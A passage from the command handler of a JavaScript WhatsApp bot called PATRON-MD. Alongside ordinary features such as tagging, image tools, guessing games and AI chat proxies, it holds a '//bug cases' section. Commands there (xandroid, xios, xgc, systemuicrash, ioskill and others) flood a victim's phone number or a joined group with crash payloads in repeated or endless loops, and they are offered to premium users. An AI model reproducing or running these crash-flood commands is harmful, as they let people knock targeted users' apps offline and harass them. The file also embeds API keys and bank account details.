let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
NanoBotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replynano(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replynano(eb)
}
break
case 'dbinary': {
if (!q) return replynano(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replynano(db)
}
break
case 'toanime': case 'jadianime': {
if (!isPrem) return reply(mess.only.premium)
if (!quoted) return reply(`Which photo?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos with Caption ${prefix + command}`)
try {
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
NanoBotz.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/toanime?url=${anuu.url}&apikey=nonogembul` }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('well error report to the owner to be fixed')
	}
}
break
//=========================================\\
case 'removebg': case 'nobg': case 'hapusbackground': {
if (!quoted) return replynano(`Which is the pic bro?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos with Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
const getimg = await fetchJson(`https://api.elxyzgpt.xyz/ai/removebg?apikey=KC-d25a3f0c02be4021&url=${anuu.url}`);
const img = getimg.result.url;
NanoBotz.sendMessage(m.chat, { image: { url: img }, caption: 'berhasil menghapus background..'}, { quoted: m})
	} catch {
	  reply('well error Bro report to the owner to be fixed')
	}
}
break
//=========================================\\
case 'hd': 
  case 'remini': {
      if (!quoted) return replynano(`Where is the picture?`)
      if (!/image/.test(mime)) return replynano(`Send/reply to a photo with a caption ${prefix + command}`)
      NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
      try {
          const { remini } = require('./lib/remini')
          let media = await quoted.download()
          for (let i = 0; i < 3; i++) {
              media = await remini(media, "enhance")
          }
          NanoBotz.sendMessage(m.chat, { image: media, caption: `_Success in making ${command} 3x enhance_`}, { quoted: m})
      } catch (error) {
          console.error(error)
          reply('well error Bro report to the owner to be fixed')
      }
  }
  break
//=========================================\\
case 'ss':
case 'ssweb':{
if (!text) return replynano(`Where's the link?`)
try {
NanoBotz.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nonogembul` }}, { quoted: m})
			} catch {
	  reply('well error Bro report to the owner to be fixed')
	}
}
break
//======================================================================
case 'nulis':
  case 'magernulis': {
    if(!text) return reply('what do you want to write Bro..')
    try {
    const getimg = await fetchJson(`https://api.alyachan.dev/api/nulis?text=${encodeURIComponent(text)}&apikey=nanogembul`)
    const bukunya = getimg.data.url;
    NanoBotz.sendMessage(m.chat, { image: { url: bukunya }, caption: 'berhasil..' }, { quoted: m })
    } catch {
      reply('well error Bro report to the owner to be fixed')
    }
  }
break;
case 'ttslide': case 'tiktokslide':{
if (!text) return replynano(`Use in a way ${prefix+command} *url*\n\n_Sample_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://btch.us.kg/download/tiktokslide?url=${encodeURIComponent(text)}`)
for (let img of anu.result.images) {
  await NanoBotz.sendMessage(m.chat, { image: { url: img }, caption: anu.result.title }, { quoted: m })
}
await NanoBotz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} catch (error) {
await NanoBotz.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
//=========================================\\

//=========================================\\

//=========================================\\

case 'donate': {
  reply(`IF YOU WANT TO DONATE TO THE DEV OF THIS BOT
  *BANK DETAILS*
  🚹 _*FADARE*_
  
  🔢 5518447058
  
  🏦 _*MONIEPOINT*_
  *THANKS*`)
  }
  break

//=========================================\\

//=========================================\\
case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replynano('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Detected ${filteredArray.length} memory files <3\n\n`
if(filteredArray.length == 0) return replynano(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replynano(`${teks}`) 
await sleep(2000)
replynano("Delete memory files...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replynano("Successfully delete all memories in the session folder")     
});
}
break
//======================================================================
case 'amountbug': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
}
break
//======================================================================
//bug cases
case 'xandroid': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
}
break;
case 'xios': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
}
break;
case 'xios2':
  {
	if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
  }
  break;
  case 'xandroid2':
  {
	if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
  }
  break;
  case 'xgc':
  {
    if (!isPrem) return replyprem(mess.premium)
    if (!text) {
      return replynano("*How to send bugs to group*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a bug in large quantitiesse type as follows ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replynano("Please wait, "+command+" The bug is in the process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replynano("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await NanoBotz.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replynano("*DONEâœ… BUG has been sent to the group!.*");
      NanoBotz.groupLeave(groupTarget);
    } catch (error) {
      replynano(util.format(error));
    }
  } 
  break;
  case 'patroncrush': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break;
  case 'systemuicrash': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
}
break;
case 'patronvip': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
}
break;
case 'xsysui': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 100; i++) {
await Combox2(target)
await Combox3(target)
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
}
break;
case 'ioskill': case 'iosx': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Use in a way .${command} 234xxx`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return reply(`Example : .${command} 234xxx`)
await reply(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("*ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀꜰᴛᴇʀʟɪꜰᴇ🚹*")
  
}
break
//================================================================

//==================================================================
case 'songguess': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replynano("There is still an uninvolved session!")
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await NanoBotz.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 NanoBotz.sendText(from, `The song is a song from?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Answer: " + result.jawaban)
 NanoBotz.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/vneik8.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
}
break

//==================================================================
case 'upvn':{
if (!DanzTheCreator) return reply(`What are you doing ? This feature is specifically my master😜`)
function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoBotz.sendMessage('status@broadcast', {audio: { url: media }, mimetype: 'audio/mp3', ptt:true },{
backgroundColor: getRandomHexColor(),
statusJidList: Object.keys(db.users)
});
}
reply(`*Successfully sending Whatsapp status to people in the database*`)
break
//==================================================================

//==================================================================
case 'flagguess': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replynano("There is still an uninvolved session!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Please answer the following image\n\nClue : ${result.flag}\nTime : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.name)
    NanoBotz.sendText(m.chat, `Time has run out\nAnswer:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'flagguessv2': {
  if (!m.isGroup) return reply(mess.only.group)
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replynano("There is still an uninvolved session!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Please answer the following image\n\nClue : ${result.flag}\nTime : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Answer: " + result.name)
    NanoBotz.sendText(m.chat, `Time has run out\nAnswer:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
//==================================================================
 
  // Case-case lainnya

//==================================================================
case 'aza':
  case 'pay':
  case 'acc':
  case 'account': {
  replynano(`*BANK DETAILS*
  🚹 _*${global.bankowner}*_
  
  🔢 ${global.banknumber}
  
  🏦 _*${global.bankname}*_
  *SEND SCREENSHOT AFTER PAYMENT*`)
  }
  break

  case 'patron':{
      replynano('*PATRON SOLOS ALL 🚹*')
    }
    break

  case 'bot':
    case 'alive': {
      replynano('*PATRON-MD BOT IS ACTIVE BRO*')
    }
    break
    case 'update': {
      if (!DanzTheCreator) return reply("Only the owner can use this command.");
    
      reply("*𝗨𝗣𝗗𝗔𝗧𝗜𝗡𝗚 𝗣𝗔𝗧𝗥𝗢𝗡 𝗠𝗗....*");
      try {
        const githubRawUrl = 'https://github.com/Itzpatron/patron-testing/raw/refs/heads/master/Patron.js';
        const response = await fetch(githubRawUrl);
        
        if (!response.ok) {
          return replynano('Failed to fetch the file: ${response.statusText}');
        }
    
        const newFileContent = await response.text();
    
        // Update the byxx file
        const fs = require('fs');
        fs.writeFileSync('./Patron.js', newFileContent, 'utf8');
    
        reply("*𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐔𝐏𝐃𝐀𝐓𝐄𝐃 𝐏𝐀𝐓𝐑𝐎𝐍 𝐌𝐃!*");
      } catch (error) {
        console.error("Error updating file:", error);
        reply("Failed to update file. Please check the console for errors.");
      }
    
      break;
    }

//==================================================================

//==================================================================
case 'bing': 
case 'bingai': {
if (!q) return reply(`🍃 *What do you want to ask Bing?*`)
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        nanoai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break
case 'bard':
case 'bardai': {
                if (!text) return replynano('What is your question?')
nanoai(pushname,text)
           }
            break
//==================================================================
case 'photoleapai': {
	if (!text) return replynano('What is your question?')
	await NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}})
	try {
	  	  reply(mess.wait)
NanoBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('well error Bro report to the owner to be fixed')
	}
	}
	break
case 'prodia': {
	if (!text) return replynano('what image want to make')
	reply(mess.wait)
try {
   	  reply(mess.wait)
NanoBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('well error Bro report to the owner to be fixed')
	}
	}
	break
	case 'lamaai': {
                if (!text) return replynano('What is your question?')
nanoai(pushname, text);
           }
            break
            case 'gpt2': {
                if (!text) return replynano('What is your question?')
try {
  if (/image/.test(mime)) {
    const media = await NanoBotz.downloadAndSaveMediaMessage(quoted);
    let anuu = await UploadFileUgu(media);
    const data = await fetchJson(`https://btch.us.kg/bardimg?url=${anuu.url}&text=${encodeURIComponent(text)}`);
    const aimsg = data.result;
    reply(`${aimsg}`);
  } else {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      reply(`${data.result}`);
    } else {
      nanoai(pushname, text);
    }
  }
} catch (e) {
  reply('An error occurs, try again later.');
}
           }
            break

case 'guru-ai': {
	if (!text) return replynano(`*• Example:* ${prefix + command} Who has found a computer in the Majapahit era`);   
await NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}}) 
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        nanoai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break

   
case 'realistic': case '3dmodel': {
    	if (!text) return reply(`*Example:* ${prefix + command} blue sky`)
await NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}}) 
try {
   	  reply(mess.wait)
NanoBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('well error Bro report to the owner to be fixed')
	}
}
break
case 'ai':
case 'gpt':
case 'chatgpt':
case 'open-ai': {
	if (!text) return replynano(`*• Example:* ${prefix + command} Who has found a computer in the Majapahit era`) 
await NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}})
try {
  if (/image/.test(mime)) {
    const media = await NanoBotz.downloadAndSaveMediaMessage(quoted);
    let anuu = await UploadFileUgu(media);
    const data = await fetchJson(`https://btch.us.kg/bardimg?url=${anuu.url}&text=${encodeURIComponent(text)}`);
    const aimsg = data.result;
    reply(`${aimsg}`);
  } else {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      reply(`${data.result}`);
    } else {
      nanoai(pushname, text);
    }
  }
} catch (e) {
  reply('An error occurs, try again later.');
}

}
break

//=========================================\\======
case 'gemini': {
if (!q) return reply(`🍃 *Want to ask what Gemini is?*`)
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        nanoai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break
//=========================================\\======
case 'blackboxai': {
                if (!text) return replynano('What is your question?')
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        nanoai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
           }
            break
//=========================================\\======

//=========================================\\======

//=========================================\\======
case 'autoaigrup':case 'aigrup': case 'autoaigc':{
if (!m.isGroup) return reply('Group special features!')
if (!isAdmins && !DanzTheCreator) return reply('Admin special featues!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`Already active`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Already inactive`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _Intactive_\n${prefix+command} off -- _Mentivate_`)
}}
break
case 'autoread':
                if (!DanzTheCreator) return reply(mess.only.owner)
                if (args.length < 1) return replynano(`Sample: ${prefix + command} on/off`)
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    reply(`Managed to change the autoread to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    reply(`Managed to change the autoread to ${q}`)
                }
break

//=========================================\\======
case 'welcome':
if (!m.isGroup) return reply('Group special features!!!')
if (!isAdmins && !DanzTheCreator) return reply('Admin special featues!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return reply(`Already on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Successfully activating welcome in this group')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return reply(`Already off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Successfully deactivated welcome in this group')
} else {
reply(`${prefix+command} on -- _Intactive_\n${prefix+command} off -- _Mentivate_`)
}
break
case 'left': case 'goodbye':
if (!m.isGroup) return reply('Group special features!')
if (!isAdmins && !DanzTheCreator) return reply('Admin special featues!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return reply(`Already on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
reply('Successfully activating goodbye in this group')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return reply(`Already off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Successfully deactivated Goodbye in this group')
} else {
reply(`${prefix+command} on -- _Inactivate_\n${prefix+command} off -- _Mentivate_`)
}
break
case 'onlygroup':
            case 'onlygc':
                if (!DanzTheCreator) return reply('Special owner features!')
                if (args.length < 1) return replynano(`Sample: ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replynano(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                  db.settings[botNumber].onlygrub = false
                    replynano(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!DanzTheCreator) return reply('Special owner features!')
                if (args.length < 1) return replynano(`Sample: ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlypc = true
                    replynano(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlypc = false
                    replynano(`Successfully Changed Only-Pc To ${q}`)
                }
            break
case 'setwelcome': {
if (!m.isGroup) return reply('Group special features!')
if (!DanzTheCreator && !isAdmins) return reply('Special owner features!')
if (!text) return reply(`Use in a way ${prefix+command} *text_welcome*\n\n_Sample_\n\n${prefix+command} Hello @user, welcome to @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
reply(`Successfully set welcome!`)
}
break
case 'changewelcome':
if (!m.isGroup) return reply('Group special features!')
if (!DanzTheCreator && !isAdmins) return reply('Special owner features!')
if (!text) return reply(`Use in a way ${prefix+command} *text_welcome*\n\n_Sample_\n\n${prefix+command} Hello @user, welcome to @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
reply(`Successfully change set welcome text!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
reply(`Successfully change set welcome text!`)
}
break
case 'delsetwelcome':
if (!m.isGroup) return reply('Group special features!')
if (!DanzTheCreator && !isAdmins) return reply('Special owner features!')
if (!isSetWelcome(m.chat, set_welcome_db)) return reply(`There is no welcome set here..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
reply(`Successfully delete set welcome`)
break
case 'setleft':
if (!m.isGroup) return reply('Group special features!')
if (!DanzTheCreator && !isAdmins) return reply('Special owner features!')
if (!text) return reply(`Use in a way ${prefix + command} *text_left*\n\n_Sample_\n\n${prefix + command} Hello @user, goodbye from @group`)
if (isSetLeft(m.chat, set_left_db)) return reply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully set left!`)
break
case 'changeleft':
